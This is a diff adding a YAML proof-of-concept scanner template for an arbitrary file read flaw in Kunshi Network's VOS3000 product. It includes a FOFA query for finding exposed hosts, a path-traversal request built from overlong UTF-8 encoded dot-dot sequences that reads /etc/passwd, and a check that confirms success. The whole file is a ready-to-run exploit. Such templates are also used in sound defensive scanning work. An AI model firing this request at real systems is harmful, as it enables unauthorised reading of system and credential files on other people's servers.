@@ -1,0 +1,15 @@
+id: poc-yaml-kunshi-network-vos3000-anyfile-read
+info:
+  name: 昆石网络 VOS3000 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: vos3000
+  fofa: app="VOS-VOS3000"
+requests:
+- method: GET
+  path: /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
